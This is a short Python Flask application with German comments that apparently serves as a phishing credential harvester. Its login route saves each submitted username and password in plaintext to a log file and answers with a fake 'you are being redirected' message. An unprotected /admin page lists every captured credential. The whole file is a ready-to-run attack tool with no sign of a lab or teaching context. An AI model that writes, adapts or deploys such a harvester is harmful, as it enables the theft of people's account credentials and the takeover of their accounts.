from flask import Flask, render_template, request
from datetime import datetime
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        # Anmeldedaten in log.txt speichern
        with open("log.txt", "a") as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Username: {username} | Password: {password}\n")

        return "<h2>Danke. Du wirst weitergeleitet...</h2>"

    return render_template("index.html")


@app.route("/admin")
def admin():
    if not os.path.exists("log.txt"):
        return "<h3>Noch keine Einträge vorhanden.</h3>"

    try:
        with open("log.txt", "r") as f:
            logs = f.readlines()

        if not logs:
            return "<h3>Es wurden noch keine Daten eingegeben.</h3>"

        return "<h3>Login-Daten:</h3><br>" + "<br>".join(logs)
    except Exception as e:
        return f"<h3>Fehler beim Lesen der Datei: {str(e)}</h3>"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
